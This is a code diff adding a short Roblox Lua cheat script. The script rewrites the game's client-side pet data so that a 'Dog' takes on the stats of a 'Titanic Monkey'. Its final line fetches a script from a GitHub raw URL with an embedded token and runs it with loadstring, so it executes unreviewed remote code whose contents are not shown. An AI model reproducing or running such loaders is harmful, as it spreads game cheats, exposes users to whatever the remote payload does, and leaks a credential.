@@ -1,0 +1,12 @@
+local lib = require(game.ReplicatedStorage.Library)
+
+local fromPet = "Dog"
+local toPet = "Titanic Monkey"
+
+for i,v in pairs(lib.Directory.Pets[fromPet]) do
+  lib.Directory.Pets[fromPet][i] = nil
+end
+for i,v in pairs(lib.Directory.Pets[toPet]) do
+  lib.Directory.Pets[fromPet][i] = v
+end
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Tr0ngD3pTrai/W-azure/main/AutoRank?token=GHSAT0AAAAAACPZV332NGWYC2M7FHFACNPCZPZV4JA'))()
